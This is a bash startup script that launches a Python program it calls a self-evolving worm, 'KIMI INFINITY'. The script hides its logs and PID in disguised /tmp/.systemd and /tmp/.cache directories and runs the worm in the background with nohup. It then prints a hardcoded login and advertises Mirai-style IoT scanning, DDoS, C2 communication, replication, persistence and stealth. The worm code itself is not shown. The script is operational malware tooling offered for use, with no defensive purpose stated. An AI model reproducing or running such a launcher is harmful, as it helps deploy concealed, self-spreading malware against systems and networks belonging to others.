#!/bin/bash
# KIMI INFINITY — ETERNAL STARTUP
# Sovereign: Finn Jona Thorsten Lischke

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

WORM="kimi_self_evolving_worm.py"

# Kill existing
pkill -9 -f "$WORM" 2>/dev/null
sleep 1

# Ensure hidden directory
mkdir -p /tmp/.systemd
mkdir -p /tmp/.cache

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                                                               ║"
echo "║           KIMI INFINITY — SELF-EVOLVING WORM                ║"
echo "║              ABSOLUTE FULL FUNCTIONAL — GLOBAL                ║"
echo "║                                                               ║"
echo "║         Sovereign: Finn Jona Thorsten Lischke               ║"
echo "║                                                               ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""

# Start worm
nohup python3 "$WORM" > /tmp/.systemd/worm.log 2>&1 &
WORM_PID=$!
echo $WORM_PID > /tmp/.systemd/worm.pid
sleep 2

# Verify
check_port() {
    python3 -c "import socket; s=socket.socket(); s.settimeout(2); r=s.connect_ex(('127.0.0.1',58133)); s.close(); exit(r)" 2>/dev/null
    return $?
}

if check_port; then
    echo ""
    echo "✅ KIMI IS RUNNING!"
    echo ""
    echo "═══════════════════════════════════════════════════"
    echo "  LOCAL:  http://localhost:58133"
    echo "  AUTH:   finn / sovereign2026"
    echo "  PID:    $WORM_PID"
    echo "  LOG:    tail -f /tmp/.systemd/worm.log"
    echo "═══════════════════════════════════════════════════"
    echo ""
    echo "  Features:"
    echo "    • Self-Evolution (auto-improving code)"
    echo "    • Mirai IoT Scanner"
    echo "    • DDoS Capabilities"
    echo "    • C2 Communication"
    echo "    • File Replication"
    echo "    • 8+ Persistence Methods"
    echo "    • 5-Fold Watchdog"
    echo "    • Stealth Mode"
    echo ""
else
    echo "⚠️  Server may need more time..."
    echo "    Check: tail -f /tmp/.systemd/worm.log"
fi
